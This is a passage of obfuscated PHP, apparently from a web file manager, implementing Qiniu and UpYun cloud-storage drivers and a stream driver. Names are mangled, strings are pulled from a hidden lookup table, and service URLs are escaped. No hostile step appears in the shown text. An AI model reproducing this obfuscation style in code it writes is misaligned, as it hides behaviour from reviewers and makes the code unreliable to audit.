$¤àÔ­‚½ = '', $«üÒÍæ— = REPEAT_RENAME) { if ($this->setContent($éÔóåŞ”, $¤àÔ­‚½)) { return $this->getPathOuter($éÔóåŞ”); } return !1; } public function mkdir($¹º©èÙï, $ØÄˆîìŞ = REPEAT_SKIP) { $¶å·é˜ı =& $_SERVER[¶Ô„œ…¯]; $œá«êÍ¶ = trim($¹º©èÙï, $¶å·é˜ı[8]); if ($this->_isFolder($œá«êÍ¶)) { return $this->getPathOuter($œá«êÍ¶); } $¹º©èÙï = $œá«êÍ¶ . $¶å·é˜ı[8]; $ğµ®•˜ˆ = get_path_this($œá«êÍ¶); $î–ŞÚÔÎ = $¹º©èÙï . $ğµ®•˜ˆ; if (!$this->mkfile($î–ŞÚÔÎ)) { return !1; } if (!$this->moveFile($î–ŞÚÔÎ, $¹º©èÙï)) { $this->delFile($î–ŞÚÔÎ); return !1; } return $this->getPathOuter($œá«êÍ¶); } public function copyFile($›ì—­Ší, $¤¯·„¤) { $€­ãÙ¿æ = $this->bucketManager->copy($this->bucket, $›ì—­Ší, $this->bucket, $¤¯·„¤, !0); return $€­ãÙ¿æ ? !1 : $this->getPathOuter($¤¯·„¤); } public function moveFile($ÆÒ‘ß«„, $àö·‰©Á) { $½¿¬«µä = $this->bucketManager->move($this->bucket, $ÆÒ‘ß«„, $this->bucket, $àö·‰©Á, !0); return $½¿¬«µä ? !1 : $this->getPathOuter($àö·‰©Á); } public function delFile($½ÈäóÁ) { if (!$this->exist($½ÈäóÁ)) { return !0; } $Çç÷ „ = $this->bucketManager->delete($this->bucket, $½ÈäóÁ); if (!$Çç÷ „) { return !0; } return $Çç÷ „->code() == 612 ? !0 : !1; } public function delFolder($Óùù´‡°) { $â…â©ß =& $_SERVER[¶Ô„œ…¯]; if (!$this->exist($Óùù´‡°)) { return !0; } $this->listItemCache = !1; $ì¯ƒá¾ª = $this->fileList($Óùù´‡°); $this->listItemCache = !0; $‡ôÃÀÖƒ = trim($Óùù´‡°, $â…â©ß[8]) . $â…â©ß[8]; if (!empty($Óùù´‡°) && $Óùù´‡° !== $â…â©ß[230] && !in_array($‡ôÃÀÖƒ, $ì¯ƒá¾ª[$â…â©ß[85]])) { $ì¯ƒá¾ª[$â…â©ß[85]][] = $‡ôÃÀÖƒ; } $õéÒáÛÕ = $this->delByBatch($ì¯ƒá¾ª[$â…â©ß[86]]); if (!$õéÒáÛÕ) { return !1; } $õéÒáÛÕ = $this->delByBatch($ì¯ƒá¾ª[$â…â©ß[85]]); if (!$õéÒáÛÕ) { return !1; } return $this->delFile($‡ôÃÀÖƒ); } private function delByBatch($ ÉÒİ¹Ù) { foreach (array_chunk($ ÉÒİ¹Ù, 1000) as $öÜöÀŞ») { $ÖÑ¦¿šÛ = $this->bucketManager->buildBatchDelete($this->bucket, $öÜöÀŞ»); list($ùéÍ„éë, $µÈè½¸») = $this->bucketManager->batch($ÖÑ¦¿šÛ); if ($µÈè½¸») { return !1; } } return !0; } public function rename($­®½êÆ, $»ƒñ¡Ø) { return $this->renameObject($­®½êÆ, $»ƒñ¡Ø); } public function fileInfo($Ÿ†ˆä¼ˆ, $›™‰ñıß = false, $Íèƒ§Â¿ = array()) { $¥Û¥Ş¬¢ =& $_SERVER[¶Ô„œ…¯]; $èÎ°éÂ = array($¥Û¥Ş¬¢[32] => $this->pathThis($Ÿ†ˆä¼ˆ), $¥Û¥Ş¬¢[87] => $this->getPathOuter($¥Û¥Ş¬¢[8] . $Ÿ†ˆä¼ˆ), $¥Û¥Ş¬¢[33] => $¥Û¥Ş¬¢[232], $¥Û¥Ş¬¢[79] => isset($Íèƒ§Â¿[$¥Û¥Ş¬¢[1539]]) ? $Íèƒ§Â¿[$¥Û¥Ş¬¢[1539]] : 0, $¥Û¥Ş¬¢[169] => $this->ext($Ÿ†ˆä¼ˆ)); if ($›™‰ñıß) { return $èÎ°éÂ; } $èÎ°éÂ[$¥Û¥Ş¬¢[233]] = $èÎ°éÂ[$¥Û¥Ş¬¢[88]] = 0; $èÎ°éÂ[$¥Û¥Ş¬¢[234]] = $èÎ°éÂ[$¥Û¥Ş¬¢[235]] = !0; if (empty($Íèƒ§Â¿)) { $Íèƒ§Â¿ = $this->objectMeta($Ÿ†ˆä¼ˆ); if (!$Íèƒ§Â¿) { return $èÎ°éÂ; } } if (isset($Íèƒ§Â¿[$¥Û¥Ş¬¢[236]]) && $Íèƒ§Â¿[$¥Û¥Ş¬¢[236]]) { $èÎ°éÂ[$¥Û¥Ş¬¢[237]] = $Íèƒ§Â¿[$¥Û¥Ş¬¢[236]]; } if (isset($Íèƒ§Â¿[$¥Û¥Ş¬¢[247]]) && $Íèƒ§Â¿[$¥Û¥Ş¬¢[247]]) { $èÎ°éÂ[$¥Û¥Ş¬¢[237]] = $Íèƒ§Â¿[$¥Û¥Ş¬¢[247]]; } if (isset($Íèƒ§Â¿[$¥Û¥Ş¬¢[1540]])) { $èÎ°éÂ[$¥Û¥Ş¬¢[88]] = substr($Íèƒ§Â¿[$¥Û¥Ş¬¢[1540]] . $¥Û¥Ş¬¢[12], 0, 10); } if (isset($Íèƒ§Â¿[$¥Û¥Ş¬¢[1539]])) { $èÎ°éÂ[$¥Û¥Ş¬¢[79]] = $Íèƒ§Â¿[$¥Û¥Ş¬¢[1539]]; } return $èÎ°éÂ; } public function folderInfo($»’ÊÇ, $€ªÎ¬ˆÄ = false) { $Ö“¬çåË =& $_SERVER[¶Ô„œ…¯]; $å·¢øÊ½ = array($Ö“¬çåË[32] => $this->pathThis($»’ÊÇ), $Ö“¬çåË[87] => $this->getPathOuter($Ö“¬çåË[8] . $»’ÊÇ), $Ö“¬çåË[33] => $Ö“¬çåË[78]); if ($€ªÎ¬ˆÄ) { return $å·¢øÊ½; } $å·¢øÊ½[$Ö“¬çåË[233]] = $å·¢øÊ½[$Ö“¬çåË[88]] = 0; $å·¢øÊ½[$Ö“¬çåË[234]] = $å·¢øÊ½[$Ö“¬çåË[235]] = !0; $»’ÊÇ = rtrim($»’ÊÇ, $Ö“¬çåË[8]) . $Ö“¬çåË[8]; $©ªô“£á = $this->objectMeta($»’ÊÇ); if (isset($©ªô“£á[$Ö“¬çåË[1540]])) { $å·¢øÊ½[$Ö“¬çåË[88]] = substr($©ªô“£á[$Ö“¬çåË[1540]] . $Ö“¬çåË[12], 0, 10); } return $å·¢øÊ½; } public function listPath($Ï»äÒ„‹, $ëµØíŒ§ = false) { $ÕâŸò‹ =& $_SERVER[¶Ô„œ…¯]; $‘ù°§§¼ = $this->fileList($Ï»äÒ„‹, $ÕâŸò‹[8], !0); foreach ($‘ù°§§¼[$ÕâŸò‹[85]] as $Ç´…¸Ãé => $„†Û×¨) { $‘ù°§§¼[$ÕâŸò‹[85]][$Ç´…¸Ãé] = $this->folderInfo($„†Û×¨, $ëµØíŒ§); } foreach ($‘ù°§§¼[$ÕâŸò‹[86]] as $Ç´…¸Ãé => $„†Û×¨) { $‘ù°§§¼[$ÕâŸò‹[86]][$Ç´…¸Ãé] = $this->fileInfo($„†Û×¨[$ÕâŸò‹[97]], $ëµØíŒ§, $„†Û×¨); } return $‘ù°§§¼; } public function has($É™®ıº˜, $†á•„¯ = false, $¯Š¿ƒ¥ò = true) { $ªš½ ¥¯ =& $_SERVER[¶Ô„œ…¯]; $É™®ıº˜ = trim($É™®ıº˜, $ªš½ ¥¯[8]); $· ÓÁº = empty($É™®ıº˜) && $É™®ıº˜ !== $ªš½ ¥¯[230] ? $ªš½ ¥¯[12] : $É™®ıº˜ . $ªš½ ¥¯[8]; $Ô©«ãËŒ = $ªš½ ¥¯[12]; $¬‹ñŞ¼˜ = 500; $èÓªö“˜ = $ªš½ ¥¯[8]; $İë’Ä¤ = $¶ØëûŞ¤ = 0; while (!0) { check_abort(); list($İ¥¬Ëá­, $¹Ÿ·”¹ç) = $this->bucketManager->listFiles($this->bucket, $· ÓÁº, $Ô©«ãËŒ, $¬‹ñŞ¼˜, $èÓªö“˜); if ($¹Ÿ·”¹ç) { break; } $Ô©«ãËŒ = array_key_exists($ªš½ ¥¯[1485], $İ¥¬Ëá­) ? $Ô©«ãËŒ = $İ¥¬Ëá­[$ªš½ ¥¯[1541]] : $ªš½ ¥¯[12]; if ($†á•„¯) { if (!empty($İ¥¬Ëá­[$ªš½ ¥¯[1542]])) { $İë’Ä¤ += count($İ¥¬Ëá­[$ªš½ ¥¯[1542]]); } if (!empty($İ¥¬Ëá­[$ªš½ ¥¯[1543]])) { $¶ØëûŞ¤ += count($İ¥¬Ëá­[$ªš½ ¥¯[1543]]); } if ($Ô©«ãËŒ === $ªš½ ¥¯[12]) { break; } continue; } if ($¯Š¿ƒ¥ò) { if (!empty($İ¥¬Ëá­[$ªš½ ¥¯[1542]])) { return !0; } } else { if (!empty($İ¥¬Ëá­[$ªš½ ¥¯[1543]])) { return !0; } } if ($Ô©«ãËŒ === $ªš½ ¥¯[12]) { break; } } if ($†á•„¯) { return array($ªš½ ¥¯[241] => $İë’Ä¤, $ªš½ ¥¯[242] => $¶ØëûŞ¤); } return !1; } public function listAll($×ßş†Ä±) { $›±Î½ñ« =& $_SERVER[¶Ô„œ…¯]; $¬ÁÄõÁ‘ = $this->fileList($×ßş†Ä±, $›±Î½ñ«[12], !0); $”»¾‚‚× = array_to_keyvalue($¬ÁÄõÁ‘[$›±Î½ñ«[86]], $›±Î½ñ«[32]); foreach ($¬ÁÄõÁ‘[$›±Î½ñ«[85]] as $öÀİöŸ´) { if (is_string($öÀİöŸ´)) { $”»¾‚‚×[$öÀİöŸ´] = array($›±Î½ñ«[79] => 0); } } return $this->listAllFiles($×ßş†Ä±, $”»¾‚‚×); } private function fileList($¾¸—©ƒå, $Å˜ï‘ì‡ = '', $¹ì§¹•  = 0) { $¿ªæõ‚™ =& $_SERVER[¶Ô„œ…¯]; $¾¸—©ƒå = trim($¾¸—©ƒå, $¿ªæõ‚™[8]); $¸Ÿ™ôáÜ = empty($¾¸—©ƒå) && $¾¸—©ƒå !== $¿ªæõ‚™[230] ? $¿ªæõ‚™[12] : $¾¸—©ƒå . $¿ªæõ‚™[8]; $âÉşÓ½¯ = $¿ªæõ‚™[12]; $“»Ø§Š‹ = 1000; $¨ê€Ä¢œ = $”£‘ÖƒØ = array(); while (!0) { check_abort(); list($˜ÉÅÆ¹á, $Ú£æÑ·Î) = $this->bucketManager->listFiles($this->bucket, $¸Ÿ™ôáÜ, $âÉşÓ½¯, $“»Ø§Š‹, $Å˜ï‘ì‡); if ($Ú£æÑ·Î) { break; } $âÉşÓ½¯ = array_key_exists($¿ªæõ‚™[1485], $˜ÉÅÆ¹á) ? $âÉşÓ½¯ = $˜ÉÅÆ¹á[$¿ªæõ‚™[1541]] : $¿ªæõ‚™[12]; $ø®š¶¾Ù = isset($˜ÉÅÆ¹á[$¿ªæõ‚™[1542]]) ? $˜ÉÅÆ¹á[$¿ªæõ‚™[1542]] : array(); $îéËÙÊä = isset($˜ÉÅÆ¹á[$¿ªæõ‚™[1543]]) ? $˜ÉÅÆ¹á[$¿ªæõ‚™[1543]] : array(); foreach ($ø®š¶¾Ù as $½ìŞƒªØ) { if ($½ìŞƒªØ[$¿ªæõ‚™[97]] == $¸Ÿ™ôáÜ) { continue; } $³ è–Ê = $½ìŞƒªØ[$¿ªæõ‚™[97]]; $‹«ï¸¹’ = $½ìŞƒªØ[$¿ªæõ‚™[1539]]; $½ìŞƒªØ[$¿ªæõ‚™[79]] = $‹«ï¸¹’; $¢ĞïÁ¨ = $‹«ï¸¹’ == 0 && substr($³ è–Ê, strlen($³ è–Ê) - 1, 1) == $¿ªæõ‚™[8] ? !0 : !1; $this->cacheMethodInfoSet($³ è–Ê, $¢ĞïÁ¨, $½ìŞƒªØ); if ($¢ĞïÁ¨) { $¨ê€Ä¢œ[] = $³ è–Ê; continue; } $”£‘ÖƒØ[] = $¹ì§¹•  ? $½ìŞƒªØ : $³ è–Ê; } foreach ($îéËÙÊä as $³ è–Ê) { if ($³ è–Ê == $¸Ÿ™ôáÜ) { continue; } $¨ê€Ä¢œ[] = $³ è–Ê; $this->cacheMethodInfoSet($³ è–Ê, !0); } if ($âÉşÓ½¯ === $¿ªæõ‚™[12]) { break; } } $this->cacheMethodInfoSet($¾¸—©ƒå, !0); return array($¿ªæõ‚™[85] => $¨ê€Ä¢œ, $¿ªæõ‚™[86] => $”£‘ÖƒØ); } public function canRead($îÇ¨–ô) { return $this->exist($îÇ¨–ô) ? !0 : !1; } public function canWrite($ªšü¡) { return $this->exist($ªšü¡) ? !0 : !1; } public function getContent($Ç¹Şîüˆ) { return $this->fileSubstr($Ç¹Şîüˆ, 0, -1); } public function setContent($æûç¸ÈŸ, $š¬¢çˆä = '') { $¯ë½’Ñ¢ = $this->tempFile($this->pathThis($æûç¸ÈŸ)); file_put_contents($¯ë½’Ñ¢, $š¬¢çˆä); if ($this->upload($æûç¸ÈŸ, $¯ë½’Ñ¢)) { $this->tempFileRemve($¯ë½’Ñ¢); return !0; } return !1; } public function refreshUrls($æ®¶ùÔµ) { $¶ë”¶ÊÈ =& $_SERVER[¶Ô„œ…¯]; $äá‡ğû© = array(); if (is_array($æ®¶ùÔµ)) { foreach ($æ®¶ùÔµ as $îêàŸô¶) { $äá‡ğû©[] = $this->link($îêàŸô¶); } } else { $äá‡ğû©[] = $this->link($æ®¶ùÔµ); } $Å§Ù÷±Ñ = new Qiniu\Cdn\CdnManager($this->auth); list($¡ÉõßÏê, $²³–÷†›) = $Å§Ù÷±Ñ->refreshUrls($äá‡ğû©); if ($²³–÷†›) { return !1; } return $¡ÉõßÏê[$¶ë”¶ÊÈ[1271]] == $¶ë”¶ÊÈ[837] ? !0 : !1; } public function fileSubstr($¬šÈ‰, $ç—ƒöé, $À¹’Ëëâ) { $Û¯Ú¶Ğ± =& $_SERVER[¶Ô„œ…¯]; if (!($³¼Ò¶¤§ = $this->link($¬šÈ‰))) { return !1; } $¡‘ƒˆí = !1; if ($À¹’Ëëâ > 0) { $ã«Ô“¹ş = $ç—ƒöé + $À¹’Ëëâ - 1; $¡‘ƒˆí = array($Û¯Ú¶Ğ±[1544] . $ç—ƒöé . $Û¯Ú¶Ğ±[464] . $ã«Ô“¹ş); } $ûã„´â³ = url_request($³¼Ò¶¤§, $Û¯Ú¶Ğ±[1504], !1, $¡‘ƒˆí); return $ûã„´â³[$Û¯Ú¶Ğ±[828]] ? $ûã„´â³[$Û¯Ú¶Ğ±[1294]] : !1; } public function upload($æ¾«ÙÉí, $¸‘îßüö, $Ø¹ ƒâä = false, $ĞÍˆñıÃ = REPEAT_REPLACE) { $¤™ÊæÄ› = new Qiniu\Storage\UploadManager(); $ƒÑ¢üôÉ = $this->auth->uploadToken($this->bucket, $æ¾«ÙÉí); $¥©¸ƒÖ = get_file_mime(get_path_ext($¸‘îßüö)); list($à°™™ï, $Û»Íİâı) = $¤™ÊæÄ›->putFile($ƒÑ¢üôÉ, $æ¾«ÙÉí, $¸‘îßüö, null, $¥©¸ƒÖ); return $Û»Íİâı ? !1 : $this->getPathOuter($æ¾«ÙÉí); } public function uploadFormData($÷Ëš¢š, $ÑÂäªë´ = 3600) { return $this->uploadToken($÷Ëš¢š, $ÑÂäªë´); } public function uploadMultiData($Ş‘Ò…Ğ, $‹®ééÛ = 3600) { return $this->uploadToken($Ş‘Ò…Ğ, $‹®ééÛ); } private function uploadToken($£ˆ¹„ë, $Øçèù± = 3600) { $ “ù‘© =& $_SERVER[¶Ô„œ…¯]; $óö°Ãì‹ = $Øçèù±; $óÛ¾¨²Æ = array($ “ù‘©[1545] => $ “ù‘©[1546]); $ûïƒºù = $£ˆ¹„ë; $Œ‹ã– = $this->auth->uploadToken($this->bucket, $ûïƒºù, $óö°Ãì‹, $óÛ¾¨²Æ, !0); $À‚ÆòÊÉ = empty($this->region) || $this->region == $ “ù‘©[1547] ? $ “ù‘©[12] : $ “ù‘©[464] . $this->region; $ ìÏ£Í = http_type() . "\x3a\x2f\57\165\x70\154\x6f\x61\144{$À‚ÆòÊÉ}\x2e\x71\151\x6e\151\165\x70\56\143\x6f\x6d\x2f"; return array($ “ù‘©[1548] => $Œ‹ã–, $ “ù‘©[1549] => $ ìÏ£Í); } public function download($ëÛûûÒÛ, $ƒÉö¸…) { $š™€†ÈÁ = IO::getPathInner(IO::mkfile($ƒÉö¸…)); if (!($Æë½Îö = $this->link($ëÛûûÒÛ))) { return !1; } $Ô¢°‡ÑÓ = 0; $ñØî´ª = 1024 * 200; $æıîêÌ¡ = fopen($š™€†ÈÁ, $_SERVER[¶Ô„œ…¯][1550]); while (!0) { $¼µ¡ = $this->fileSubstr($ëÛûûÒÛ, $Ô¢°‡ÑÓ, $ñØî´ª); if ($¼µ¡ === !1) { return !1; } fwrite($æıîêÌ¡, $¼µ¡); $Ô¢°‡ÑÓ += $ñØî´ª; if (strlen($¼µ¡) < $ñØî´ª) { break; } } fclose($æıîêÌ¡); return $ƒÉö¸…; } public function link($¬¨Ëëİ, $¬Ñ”óŞÑ = '') { if (!$this->isFile($¬¨Ëëİ)) { return !1; } $ªûÉÙ÷ = $this->getHost() . $_SERVER[¶Ô„œ…¯][8] . $this->pathEncode($¬¨Ëëİ) . $¬Ñ”óŞÑ; return $this->auth->privateDownloadUrl($ªûÉÙ÷, 3600 * 12); } public function fileOut($¨îºøæğ, $ÁÉÚçĞ« = false, $««ÌöÆÕ = false, $¨óüúã = '') { $ù§¦†Í =& $_SERVER[¶Ô„œ…¯]; if ($this->isFileOutServer()) { return $this->fileOutServer($¨îºøæğ, $ÁÉÚçĞ«, $««ÌöÆÕ, $¨óüúã); } if (!$««ÌöÆÕ) { $««ÌöÆÕ = $this->pathThis($¨îºøæğ); } $¢ÑÊ§öù = $ÁÉÚçĞ« ? $ù§¦†Í[1551] . rawurlencode($««ÌöÆÕ) : $ù§¦†Í[12]; $ÅÃØ’Ò® = $this->link($¨îºøæğ, $¢ÑÊ§öù); $this->fileOutLink($ÅÃØ’Ò®); } public function fileOutServer($ç¼é»ù…, $˜ÔŒ…ô = false, $äœŠ„ã = false, $†¯¥­œü = '') { parent::fileOut($ç¼é»ù…, $˜ÔŒ…ô, $äœŠ„ã, $†¯¥­œü); } public function fileOutImage($–Í®‘†„, $„–ññŒ“ = 250) { if ($this->size($–Í®‘†„) > 1024 * 1024 * 20) { return $this->fileOutImageServer($–Í®‘†„, $„–ññŒ“); } $€¯¯¿Öø = $this->link($–Í®‘†„, $_SERVER[¶Ô„œ…¯][1552] . $„–ññŒ“); $this->fileOutLink($€¯¯¿Öø); } public function fileOutImageServer($·ÌšïÚ, $¨Ğ¼è = 250) { parent::fileOutImage($·ÌšïÚ, $¨Ğ¼è); } public function hashMd5($Í´ØºµŞ) { $ËàÇşéÕ =& $_SERVER[¶Ô„œ…¯]; $„î…ûš– = $this->objectMeta($Í´ØºµŞ); return isset($„î…ûš–[$ËàÇşéÕ[247]]) ? $„î…ûš–[$ËàÇşéÕ[247]] : !1; $÷ù²ª‚´ = $this->link($Í´ØºµŞ, $ËàÇşéÕ[1553]); } public function size($…¬º×¬Œ) { $ß¦›õø• = $this->objectMeta($…¬º×¬Œ); return $ß¦›õø• ? $ß¦›õø•[$_SERVER[¶Ô„œ…¯][79]] : 0; } public function info($óßƒòÜ) { if ($this->isFolder($óßƒòÜ)) { return $this->folderInfo($óßƒòÜ); } else { if ($this->isFile($óßƒòÜ)) { return $this->fileInfo($óßƒòÜ); } } return !1; } public function exist($Òˆô£ê½) { return $this->isFile($Òˆô£ê½) || $this->isFolder($Òˆô£ê½); } public function isFile($æã·ËûË) { return !$this->isFolder($æã·ËûË) && $this->objectMeta($æã·ËûË); } public function isFolder($Æ±Š£ãÚ) { return $this->cacheMethod($_SERVER[¶Ô„œ…¯][179], $Æ±Š£ãÚ); } protected function objectMeta($öô†¾‚Ù) { return $this->cacheMethod($_SERVER[¶Ô„œ…¯][181], $öô†¾‚Ù); } protected function _objectMeta($äÄè‰ƒì) { $Äëø ¬² =& $_SERVER[¶Ô„œ…¯]; list($ª®‡äê•, $Ù­òÉô·) = $this->bucketManager->stat($this->bucket, $äÄè‰ƒì); if ($ª®‡äê•) { $ª®‡äê•[$Äëø ¬²[79]] = intval($ª®‡äê•[$Äëø ¬²[1539]]); } return $ª®‡äê•; } protected function _isFolder($âÊ‰éüş) { $¨¥ÅÖè’ =& $_SERVER[¶Ô„œ…¯]; if ($âÊ‰éüş == $¨¥ÅÖè’[12] || $âÊ‰éüş == $¨¥ÅÖè’[8]) { return !0; } list($‡ºĞÕİ£, $ÑèØ³·½) = $this->bucketManager->listFiles($this->bucket, trim($âÊ‰éüş, $¨¥ÅÖè’[8]) . $¨¥ÅÖè’[8], $¨¥ÅÖè’[12], 1, $¨¥ÅÖè’[8]); return !empty($‡ºĞÕİ£[$¨¥ÅÖè’[1542]]) || !empty($‡ºĞÕİ£[$¨¥ÅÖè’[1543]]) ? !0 : !1; } } class PathDriverStream extends PathDriverBase { const TYPE_STRING = 1; const TYPE_FILE = 2; public function __construct($Âï‹Åø, $Üœóè¶ = 0) { parent::__construct(); $this->source = $Âï‹Åø; $this->sourceSize = $Üœóè¶; if (is_string($this->source)) { $this->sourceType = self::TYPE_STRING; $this->sourceSize = strlen($this->source); } else { $this->sourceType = self::TYPE_FILE; } } public function size($‘´Şì¨Ô = false) { return $this->sourceSize; } public function getContent($šÈãòÜ = false) { return $this->fileSubstr($šÈãòÜ, 0, $this->sourceSize); } public function fileSubstr($š¹‰â¶  = false, $ÒŠüØ–ş = 0, $¬ú¦ïã± = 0) { if (!$¬ú¦ïã±) { $¬ú¦ïã± = $this->sourceSize; } $»ÉğîŞ„ = $this->sourceSize - $ÒŠüØ–ş; if ($¬ú¦ïã± >= $»ÉğîŞ„) { $¬ú¦ïã± = $»ÉğîŞ„; } if ($this->sourceType == self::TYPE_STRING) { return substr($this->source, $ÒŠüØ–ş, $¬ú¦ïã±); } if ($this->sourceType == self::TYPE_FILE) { if ($¬ú¦ïã± <= 0) { return $_SERVER[¶Ô„œ…¯][12]; } $©íÜµÉ¼ = ftell($this->source); fseek_64($this->source, $©íÜµÉ¼ + $ÒŠüØ–ş); $°»®µÅ“ = @fread($this->source, $¬ú¦ïã±); fseek_64($this->source, $©íÜµÉ¼); return $°»®µÅ“; } } public function hashMd5($â ø×› = false) { return md5($this->getContent()); } public static function hash($•š˜°üŸ, $©çë¾õÛ = 0) { $è½—–ÍÑ = new PathDriverStream($•š˜°üŸ, $©çë¾õÛ); return $è½—–ÍÑ->hashSimple($•š˜°üŸ); } public static function md5($Ÿ«®Åİë, $œõ×şÉó = 0) { $à‰¨úô‰ = new PathDriverStream($Ÿ«®Åİë, $œõ×şÉó); return $à‰¨úô‰->hashMd5($Ÿ«®Åİë); } } class PathDriverUSS extends PathDriverBase { protected $bucket = ''; protected $username = ''; protected $userpass = ''; protected $domain = ''; protected $token = ''; protected $endpoint = "\150\164\x74\x70\72\x2f\x2f\166\60\x2e\141\160\151\x2e\x75\160\171\x75\156\x2e\143\157\x6d"; public $ioUploadServer = 0; public $ioFileOutServer = 0; public function __construct($“ŞÒ‹Ÿ–) { parent::__construct(); $this->_init($“ŞÒ‹Ÿ–); } public function _init($İÂ½²í¤) { $ªíà» =& $_SERVER[¶Ô„œ…¯]; foreach ($İÂ½²í¤ as $àÆìÑœÇ => $·æ†‘±Ú) { if (isset($this->{$àÆìÑœÇ})) { $this->{$àÆìÑœÇ} = $·æ†‘±Ú; } } if (empty($this->username) || empty($this->userpass) || empty($this->domain)) { throw new Exception($ªíà»[1554] . LNG($ªíà»[1473])); } } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } private function ussHeaders($Ê˜Ø×ï, $ÖîÊ‹–Ê = "\x47\x45\124") { $¯ÊøìÕ´ =& $_SERVER[¶Ô„œ…¯]; $õ†‹™é = gmdate($¯ÊøìÕ´[1502]); $Š¥’¨˜Ş = base64_encode(hash_hmac($¯ÊøìÕ´[1555], "{$ÖîÊ‹–Ê}\x26{$Ê˜Ø×ï}\x26{$õ†‹™é}", md5("{$this->userpass}"), !0)); $úù°«À÷ = array("\101\165\164\x68\157\162\x69\x7a\141\164\x69\x6f\156\72\x55\x50\x59\x55\x4e\40{$this->username}\x3a{$Š¥’¨˜Ş}", "\104\x61\x74\x65\72{$õ†‹™é}"); return $úù°«À÷; } public function ussRequest($Â€Í„¥á, $¡™­™ùÑ = "\107\105\x54", $éÜ¥ò = false, $‘Éù¾¸¾ = false, $ÎËğà = false) { $¯Ûù–‚˜ =& $_SERVER[¶Ô„œ…¯]; $Â€Í„¥á = trim($Â€Í„¥á, $¯Ûù–‚˜[8]); $ÊÍòàŠ = "\x2f{$this->bucket}\x2f" . rawurlencode($Â€Í„¥á); $Øšò¶²ß = $this->ussHeaders($ÊÍòàŠ, $¡™­™ùÑ); if ($‘Éù¾¸¾) { $Øšò¶²ß = array_merge($Øšò¶²ß, $‘Éù¾¸¾); } $ ‹ŞÅÏª = url_request($this->endpoint . $ÊÍòàŠ, $¡™­™ùÑ, $éÜ¥ò, $Øšò¶²ß, $ÎËğà); if (!$ ‹ŞÅÏª) { $¡¢ñ«ë¾ = LNG($¯Ûù–‚˜[1556]); $this->writeLog($¡¢ñ«ë¾); return array($¯Ûù–‚˜[1304] => !1, $¯Ûù–‚˜[1294] => $¡¢ñ«ë¾); } if (strtolower($¡™­™ùÑ) == $¯Ûù–‚˜[229] || in_array($ ‹ŞÅÏª[$¯Ûù–‚˜[1304]], array($¯Ûù–‚˜[263], $¯Ûù–‚˜[1557]))) { $éÜ¥ò = $ ‹ŞÅÏª[$¯Ûù–‚˜[1558]]; if (!$ ‹ŞÅÏª[$¯Ûù–‚˜[828]]) { $éÜ¥ò = isset($éÜ¥ò[0]) ? $éÜ¥ò[0] : $¯Ûù–‚˜[12]; } } else { $éÜ¥ò = json_decode($ ‹ŞÅÏª[$¯Ûù–‚˜[1294]], !0); if (!$éÜ¥ò) { $éÜ¥ò = $ ‹ŞÅÏª[$¯Ûù–‚˜[1294]]; } else { if (!$ ‹ŞÅÏª[$¯Ûù–‚˜[828]] && isset($éÜ¥ò[$¯Ûù–‚˜[1559]])) { $éÜ¥ò = $éÜ¥ò[$¯Ûù–‚˜[1559]]; } } } if (!$ ‹ŞÅÏª[$¯Ûù–‚˜[828]]) { $this->writeLog($this->__errorMessage($éÜ¥ò)); } return array($¯Ûù–‚˜[1304] => $ ‹ŞÅÏª[$¯Ûù–‚˜[828]], $¯Ûù–‚˜[1294] => $éÜ¥ò); } private function __errorMessage($ãç§üûß) { $ùû¾öÜÌ =& $_SERVER[¶Ô„œ…¯]; if (!$ãç§üûß) { return $ùû¾öÜÌ[12]; } static $òìÖéŠ¢ = null; if (!$òìÖéŠ¢) { $òìÖéŠ¢ = I18n::getType(); } if ($òìÖéŠ¢ != $ùû¾öÜÌ[1512]) { return $ãç§üûß; } $ÖÒ‘üö = array($ùû¾öÜÌ[1560] => $ùû¾öÜÌ[1561], $ùû¾öÜÌ[1562] => $ùû¾öÜÌ[1563], $ùû¾öÜÌ[1564] => $ùû¾öÜÌ[1563], $ùû¾öÜÌ[1565] => $ùû¾öÜÌ[1566], $ùû¾öÜÌ[1567] => $ùû¾öÜÌ[1568], $ùû¾öÜÌ[1569] => $ùû¾öÜÌ[1570], $ùû¾öÜÌ[1571] => $ùû¾öÜÌ[1572]); return isset($ÖÒ‘üö[$ãç§üûß]) ? $ÖÒ‘üö[$ãç§üûß] : $ãç§üûß; } public function mkfile($Ë»ìÛ›õ, $•½¬Õæ = '', $Ê­°ã±¾ = REPEAT_RENAME) { if ($this->setContent($Ë»ìÛ›õ, $•½¬Õæ)) { return $this->getPathOuter($Ë»ìÛ›õ); } return !1; } public function mkdir($èÑ€¯¤é, $É’ú¥÷ú = REPEAT_SKIP) { $Ñ–õ™”ø =& $_SERVER[¶Ô„œ…¯]; $²§®Ş Â = trim($èÑ€¯¤é, $Ñ–õ™”ø[8]); if ($this->_isFolder($²§®Ş Â)) { return $this->getPathOuter($²§®Ş Â); } $§›´©éÍ = array($Ñ–õ™”ø[1573]); $…úÆ¦É• = $this->ussRequest($²§®Ş Â, $Ñ–õ™”ø[290], !1, $§›´©éÍ); return $…úÆ¦É•[$Ñ–õ™”ø[1304]] ? $this->getPathOuter($²§®Ş Â) : !1; } public function copyFile($æéŠ¡Ãö, $Ëğò‚Á—) { $ÛÖ²Ä‘ =& $_SERVER[¶Ô„œ…¯]; $êûâ•õ± = array($ÛÖ²Ä‘[1574] . "\57{$this->bucket}\57{$æéŠ¡Ãö}", $ÛÖ²Ä‘[1575]); $ ¸İöÌ± = $this->ussRequest($Ëğò‚Á—, $ÛÖ²Ä‘[255], !1, $êûâ•õ±); return $ ¸İöÌ±[$ÛÖ²Ä‘[1304]] ? !0 : $this->getPathOuter($Ëğò‚Á—); } public function moveFile($Œ‰ß†È, $¾Üğèü) { $´ãôŒ©è =& $_SERVER[¶Ô„œ…¯]; $°‘¾Û¦ = array($´ãôŒ©è[1576] . "\x2f{$this->bucket}\x2f{$Œ‰ß†È}", $´ãôŒ©è[1575]); $³ò¢¢‚– = $this->ussRequest($¾Üğèü, $´ãôŒ©è[255], !1, $°‘¾Û¦); return $³ò¢¢‚–[$´ãôŒ©è[1304]] ? !0 : $this->getPathOuter($¾Üğèü); } public function delFile($®öÀ½²×) { $á ’ñ«Ò =& $_SERVER[¶Ô„œ…¯]; $ääØÁá = $this->ussRequest($®öÀ½²×, $á ’ñ«Ò[1577]); return $ääØÁá[$á ’ñ«Ò[1304]] ? !0 : !1; } public function delFolder($¢ûôƒø¬) { $ÊÓªµ€ =& $_SERVER[¶Ô„œ…¯]; if (!$this->exist($¢ûôƒø¬)) { return !0; } 